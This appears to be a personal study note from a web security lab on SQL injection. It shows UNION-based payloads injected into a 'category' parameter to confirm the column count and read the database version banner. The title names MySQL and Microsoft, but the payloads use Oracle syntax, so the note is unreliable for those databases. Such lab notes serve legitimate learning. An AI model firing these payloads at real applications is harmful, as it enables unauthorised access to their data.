---
{"dg-publish":true,"permalink":"/src/site/notes/src/site/notes/src/site/notes/src/site/notes/main/cs/ps-wsa-labs/sq-li/querying-the-database-type-and-version-on-my-sql-and-microsoft/"}
---






- Can use a UNION attack to retrieve the results from an injected query.
- Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:

```Plain
'+UNION+SELECT+'abc','def'+FROM+dual--
```

- After verifying the category,
    - Use the following payload to display the database version: `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`